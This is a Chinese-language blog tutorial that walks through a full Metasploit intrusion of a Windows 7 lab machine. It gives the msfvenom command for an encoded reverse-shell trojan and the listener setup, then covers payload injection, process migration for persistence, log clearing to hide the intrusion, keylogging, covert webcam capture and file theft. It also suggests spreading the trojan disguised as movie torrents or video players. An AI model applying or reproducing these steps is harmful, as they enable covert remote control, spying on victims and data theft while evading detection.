---
title: metasploit渗透一条龙
date: 2016-08-06 20:42:47
tags: hack
---
**安全之所以让人着迷，是因为它能让你看见与往日不同的世界---ayu**

## 简单介绍metasploit
什么是metasploit，其实就是像360这样的软件，只是主攻方向与360相反，是一款开源的漏洞测试工具，将负载控制(payload)、编码器(encode)、无操作生成器(nops)和漏洞整合在一起，它集成了各种平台(android、windows、linux)下的场景漏洞和流行shellcode，windows环境下安装[metasploit](http://www.metasploit.com/)

## 攻击载荷
你想要在目标计算机上实现的“额外功能”或行为上的改变，是攻击成功后的事情，漏洞攻击程序才负责攻击，攻击成功后会启动你设置的攻击载荷，来完成我们想要完成的事

## hack开始
### 制作木马
我的运行环境是[kali系统](http://baike.baidu.com/view/804744.htm)（里面集成了300多种渗透工具），是一个非常强大的渗透操作系统，kali里面内置了metasploit

打开终端控制器，输入
```
	root@kali:~# msfconsole
```
开启msfconsole程序，成功开启时，如图：
![运行msf](http://obfs4iize.bkt.clouddn.com/%E8%BF%90%E8%A1%8Cmsf.png)

自己的实验环境是在安装了window7的虚拟机中，在cmd下用命令ipconfig查看本台虚拟机的IP地址，再在kali下用ifconfig查看IP地址，确保可以ping通，为实验打好基础运行环境。
![windwos的ip](http://obfs4iize.bkt.clouddn.com/windows%E7%9A%84ip.png)
![kali的ip](http://obfs4iize.bkt.clouddn.com/kali%E7%9A%84ip.png)
知道这些ip也是制作木马的参数

现在明确几点：
入侵者kali：ip为：192.168.88.128

被入侵这windows7：ip为：192.168.88.129

开启新的命令终端，写上
```
	root@kali:~#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=22222 -b '/x00/xff' -e x86/shikata_ga_nai -f exe > /home/ayu.exe
```
![生成木马的命令](http://obfs4iize.bkt.clouddn.com/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%91%BD%E4%BB%A4.png)
**参数解释：**
-p：攻击载荷是什么 		这里是windows/meterpreter/reverse_tcp
LHOST：入侵者的IP地址
LPORT：入侵者的端口地址
-b：将'/x00/xff'在网络传输过程中去除掉，避免产生乱码
-e：表示攻击载荷的编码方式，这里选择X86/shikata_ga_nai
-f：表示要输出的文件格式可是是php，可以是exe

这里的攻击载荷是反向连接类型，通俗说，就是木马要放置在被入侵方，运行后，木马会找寻入侵方，这里是kali，就是根据kali的ip来找到它，这里的IP就是通过LHOST来设置，然后通过设定好的端口号来连接入侵方，这样入侵方就可以下达指令了，这里的端口号通过LPORT来设置。

生成好的木马为exe文件
![生成的木马](http://obfs4iize.bkt.clouddn.com/%E7%94%9F%E6%88%90%E7%9A%84%E6%9C%A8%E9%A9%AC.png)

然后各显神通的散播出去，如最新电影的种子，要看小片片的播放器，总之是能引起你注意的，当然这些病毒都会通过很多方法去改变自己的样貌，使之具有欺骗性，如变成.doc结尾或.ppt结尾的文件，这个在下篇博文介绍

### 配置msf
当木马制作完后，我们要对msf进行相应的配置，才可以接受到ayu.exe返回的有效的反向连接。

回到msf的命令终端，输入
```
	msf> use exploit/multi/handler
```
就让handler模块，msf有很多模块，这里使用这一种
为其设置攻击载荷，这里设置的攻击载荷和刚刚我们有命令形成的木马ayu.exe的载荷要相同

![设置payload](http://obfs4iize.bkt.clouddn.com/%E8%AE%BE%E7%BD%AEpayload.png)

查看一下这个攻击载荷的属性，看看有什么需要设置的，reverse_tcp是一个功能比较简单的载荷
![查看payload的配置](http://obfs4iize.bkt.clouddn.com/%E6%9F%A5%E7%9C%8Bpayload%E7%9A%84%E9%85%8D%E7%BD%AE.png)

配置LHOST和LPORT，跟之前创建的木马的LHOST和LPORT一致，这样木马ayu.exe反向连接才能成功！

![配置ip和端口](http://obfs4iize.bkt.clouddn.com/%E9%85%8D%E7%BD%AEip%E5%92%8C%E7%AB%AF%E5%8F%A3.png)

然后输入exploit，启动监听器监听22222端口
```
 msf exploit(handler) > exploit
```

将木马放置在window7系统中，双击运行木马
![运行window木马](http://obfs4iize.bkt.clouddn.com/%E8%BF%90%E8%A1%8Cwindows%E6%9C%A8%E9%A9%AC.png)

很快我们入侵成功，就可以拿到window的shell

一般msf工具为我们集成了meterpreter这个超级shell（壳），可以完成很多普通shell不能完成的事情，是专门为渗透人员设计的

查看渗透到的系统的信息
![查看window信息](http://obfs4iize.bkt.clouddn.com/%E6%9F%A5%E7%9C%8Bwindow%E4%BF%A1%E6%81%AF.png)

可以看见，我们入侵的是window7的64位系统，系统语言是中文，我们的木马是32位的win运行程序

### 可以做的坏事
弄了这么多，拿到了权限，可以做的事情就很多了
如，开启拥有摄像头的电脑的摄像头，看看用电脑的人长相（所以我的摄像头都是用胶布封住的）

看看其中的一些功能，感受一下meterpreter的强大
![语言监听和键盘记录](http://obfs4iize.bkt.clouddn.com/%E8%AF%AD%E8%A8%80%E7%9B%91%E5%90%AC%E5%92%8C%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95.png)
这两个功能，可以实现语音监听，如果木马安装到android，你跟你女票说的肉麻话都会被第三者监听
还有一个是键盘记录，各种账号密码的输入都会被监听

下面演示一些功能：

拿到window的cmd命令终端
![拿到cmd](http://obfs4iize.bkt.clouddn.com/%E6%8B%BF%E5%88%B0cmd.png)
这样我们在入侵者电脑中就可以向对方本人一样操作电脑，当然你要熟悉cmd命令控制端

![可以用cmd控制window](http://obfs4iize.bkt.clouddn.com/%E5%8F%AF%E4%BB%A5%E7%94%A8cmd%E6%9D%A5%E6%8E%A7%E5%88%B6window.png)

将拿到的meterpreter挂起，让其在后台休眠一些，我们可以通过ayu.exe这个木马，给目标window7注入新的木马

![将线程挂起](http://obfs4iize.bkt.clouddn.com/%E5%B0%86%E7%BA%BF%E7%A8%8B%E6%8C%82%E8%B5%B7.png)

回到msf
![回到msf](http://obfs4iize.bkt.clouddn.com/%E5%9B%9E%E5%88%B0msf.png)
进入另外一个模块，用于利用现有的木马注入新的木马，命令如下
```
	msf > use post/windows/manage/payload_inject
```
顺便查看它的属性，这个模块的属性比较多
![注入多一个木马](http://obfs4iize.bkt.clouddn.com/%E6%B3%A8%E5%85%A5%E5%A4%9A%E4%B8%80%E4%B8%AA%E6%9C%A8%E9%A9%AC.png)

设置HANDLER为true，开启处理程序
设置LHOST已经为入侵方的IP，这里为192.168.88.128
设置LPORT，这里设置22223，不可为22222，因为22222已经被占用了
![注入新payload](http://obfs4iize.bkt.clouddn.com/%E6%B3%A8%E5%85%A5%E6%96%B0pyaload.png)

设置它通过session 2注入，session 2就是刚刚挂起的从ayu.exe那里得到的meterpreter
exploit 	开始利用

![绑定一个session中](http://obfs4iize.bkt.clouddn.com/%E7%BB%91%E5%AE%9A%E5%88%B0%E5%89%8D%E4%B8%80%E4%B8%AAsesssion%E4%B8%AD.png)

使用命令如下，查看进程，发现多了一个利用进程
```
 msf > sessions -i
```

![新payload](http://obfs4iize.bkt.clouddn.com/%E6%96%B0payload.png)

进入这个通过新的木马得到的session
![新木马是成功的](http://obfs4iize.bkt.clouddn.com/%E6%96%B0%E6%9C%A8%E9%A9%AC%E6%98%AF%E6%88%90%E5%8A%9F%E7%9A%84.png)
通过sysinfo，同样得到window7的系统信息

如果这个内网中有其他设备可以利用这几条命令查看到内网中的ip，进行内网渗透，因为我这个内网中就只有入侵者和被入侵者，当然这两个不一定要在同一个内网，不同的网段依旧可以，这个下篇博文介绍

内网渗透命令
![内网渗透](http://obfs4iize.bkt.clouddn.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.png)

### 几种常用命令介绍：
查看被入侵方主机闲置时间
![对方机器闲置时间](http://obfs4iize.bkt.clouddn.com/%E5%AF%B9%E6%96%B9%E6%9C%BA%E5%99%A8%E9%97%B2%E7%BD%AE%E6%97%B6%E9%97%B4.png)

清除日志，做完坏事，一定要记得清除日志，不然对方可能通过日志中的记录找到你
![清理日志](http://obfs4iize.bkt.clouddn.com/%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97.png)

拿到被入侵方的屏幕截屏
命令极为简单，screenshot，效果如下
![截屏_1](http://obfs4iize.bkt.clouddn.com/%E6%88%AA%E5%B1%8F_1.png)
![截屏](http://obfs4iize.bkt.clouddn.com/%E6%88%AA%E5%B1%8F.png)

这样你就可以非常直观的通过软件来判断对方的电脑水平或使用习惯

禁用对方的鼠标，禁用对方的键盘，让被入侵方一脸懵逼
![禁用目标主机键盘](http://obfs4iize.bkt.clouddn.com/%E7%A6%81%E7%94%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E9%94%AE%E7%9B%98.png)

查找目标主机中的文件，看看有没有什么公司商务机密，账号密码等文件
![查找文件](http://obfs4iize.bkt.clouddn.com/%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6.png)

我们通过命令查找桌面的test.txt文件，假设它是很重要的文件
![目标中的文件](http://obfs4iize.bkt.clouddn.com/%E7%9B%AE%E6%A0%87%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6.png)

通过如下命令找到test.txt
```
 meterpreter > search -f test.txt
```
如果可以判断它在c盘，可以用如下命令
```
 meterpreter > search -d c:\\ -f test.txt
```
找到test.txt在目标中的具体位置
![找到test位置](http://obfs4iize.bkt.clouddn.com/%E6%89%BE%E5%88%B0test%E4%BD%8D%E7%BD%AE.png)

将它下载到指定目录
![将它下载下来](http://obfs4iize.bkt.clouddn.com/%E5%B0%86%E5%AE%83%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5.png)

这样我就得到你的重要文件了
![下载目标中的文件](http://obfs4iize.bkt.clouddn.com/%E4%B8%8B%E8%BD%BD%E7%9B%AE%E6%A0%87%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6.png)
然后我可以清理日志，或者利用该目标为跳板，进行内网渗透

不必请求对方允许，在它不知情的情况下，开启目标摄像头
```
 meterpreter > webcam_list 
 列出目标的摄像头设备，看看它有没有,或者目标有没权限用
 meterpreter > webcam_snap
 利用摄像同拍摄照片，并保存到一个位置
 meterpreter > webcam_stream
 利用摄像头拍摄实施视频，相当于你在为他个人直播，这个功能比较卡，不推荐
```
利用webcam_snap拍摄的照片，太帅，太刺眼
![摄像头获取](http://obfs4iize.bkt.clouddn.com/%E6%91%84%E5%83%8F%E5%A4%B4%E8%8E%B7%E5%8F%96.jpg)

如果你的ayu.exe进程被关闭了怎么办，所以一般拿meterpreter的第一件是不是获取数据或偷看人家，而是转移进程，将ayu.exe获得的进程，转移到不会被轻易关闭的进程中，如很多服务进程，一般关机才会结束进程

这里将之前注入的进程转移到一个服务器进程中
首先利用ps命令看看目标中有什么进程

![ps命令](http://obfs4iize.bkt.clouddn.com/ps%E5%91%BD%E4%BB%A4.png)

这里选择services.exe这个进程

![迁移进程_1](http://obfs4iize.bkt.clouddn.com/%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B_1.png)

![转移进程_5](http://obfs4iize.bkt.clouddn.com/%E8%BD%AC%E7%A7%BB%E8%BF%9B%E7%A8%8B_5.png)

这里写的是520，是因为516的时候忘记截屏了，期间window重启了，进程号变成龙520

然后我们删除ayu.exe，用360强制解除进程占用，然后删除

![进程转移_3](http://obfs4iize.bkt.clouddn.com/%E8%BF%9B%E7%A8%8B%E7%A7%BB%E9%99%A4_3.png)

然后我们发现，没有转移的进程，死了，转移到services.exe的session 3依旧没事，还是拥有meterpreter

![进程转移_2](http://obfs4iize.bkt.clouddn.com/%E8%BF%9B%E7%A8%8B%E8%BD%AC%E7%A7%BB_2.png)

我都可以做到这种程度，那那些真正的大牛呢？**其实我们的电脑很脆弱，很多时候，我们都在虚拟世界中裸奔！**
